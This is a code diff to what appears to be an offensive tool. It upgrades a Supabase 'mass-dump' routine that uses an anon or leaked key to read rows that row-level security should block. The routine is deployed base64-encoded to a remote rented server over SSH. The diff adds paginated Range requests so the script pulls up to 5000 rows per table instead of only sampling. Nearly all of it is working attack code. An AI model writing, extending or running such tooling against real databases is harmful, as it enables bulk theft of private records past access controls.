@@ -141,18 +141,32 @@ import sys, json, urllib.request
 base = sys.argv[1].rstrip("/")          # e.g. https://abc.supabase.co
 apikey = sys.argv[2]                      # anon or leaked service key
 tables = sys.argv[3].split(",")
+page = int(sys.argv[4]) if len(sys.argv) > 4 else 1000   # rows per page
+max_rows = int(sys.argv[5]) if len(sys.argv) > 5 else 5000  # cap per table
 def get(table):
-    url = base + "/rest/v1/" + table + "?select=*&limit=1000"
-    req = urllib.request.Request(url, headers={"apikey": apikey, "Authorization": "Bearer "+apikey})
-    try:
-        r = urllib.request.urlopen(req, timeout=15); body = r.read().decode("utf-8","replace")
-        rows = json.loads(body) if body.strip().startswith("[") else []
-        cols = sorted(rows[0].keys()) if rows and isinstance(rows[0], dict) else []
-        return {"table": table, "status": r.status, "row_count": len(rows), "columns": cols[:20]}
-    except urllib.error.HTTPError as e:
-        return {"table": table, "status": e.code, "row_count": 0, "columns": []}
-    except Exception as e:
-        return {"table": table, "status": 0, "row_count": 0, "error": str(e)[:80]}
+    # Paginate via Range headers to actually pull rows at scale, capped at max_rows.
+    total = 0; cols = []; status = 0; start = 0
+    while total < max_rows:
+        url = base + "/rest/v1/" + table + "?select=*"
+        req = urllib.request.Request(url, headers={
+            "apikey": apikey, "Authorization": "Bearer "+apikey,
+            "Range-Unit": "items", "Range": "%d-%d" % (start, start+page-1)})
+        try:
+            r = urllib.request.urlopen(req, timeout=20); status = r.status
+            rows = json.loads(r.read().decode("utf-8","replace") or "[]")
+        except urllib.error.HTTPError as e:
+            return {"table": table, "status": e.code, "row_count": total, "columns": cols}
+        except Exception as e:
+            return {"table": table, "status": status, "row_count": total, "error": str(e)[:80]}
+        if not isinstance(rows, list) or not rows:
+            break
+        if not cols and isinstance(rows[0], dict):
+            cols = sorted(rows[0].keys())[:20]
+        total += len(rows)
+        if len(rows) < page:
+            break
+        start += page
+    return {"table": table, "status": status, "row_count": total, "columns": cols}
 for t in tables:
     print(json.dumps(get(t)), flush=True)
 '''
@@ -169,15 +183,16 @@ def run_cloud_supabase_dump(
     apikey: str = "",
     tables: str = "",
     supabase_url: str = "",
+    max_rows: str = "5000",
 ) -> CloudResult:
     """Use a key to read rows RLS should block, across many tables, from the box."""
     base = supabase_url or target
     key = apikey or "anon"
     table_list = tables or _DEFAULT_TABLES
-    feed.emit("attack", f"[cloud] Supabase mass-dump on {base} ({len(table_list.split(','))} tables) from box {ip}")
+    feed.emit("attack", f"[cloud] Supabase mass-dump on {base} ({len(table_list.split(','))} tables, up to {max_rows} rows/table) from box {ip}")
     cmd = (
         f"echo {_b64(_REMOTE_SUPABASE)} | base64 -d > /tmp/penny_sb.py && "
-        f"python3 /tmp/penny_sb.py {shlex.quote(base)} {shlex.quote(key)} {shlex.quote(table_list)}"
+        f"python3 /tmp/penny_sb.py {shlex.quote(base)} {shlex.quote(key)} {shlex.quote(table_list)} 1000 {shlex.quote(str(max_rows))}"
     )
     code, out, err = vultr.ssh_run(ip, cmd, timeout=120)
     exposed = []
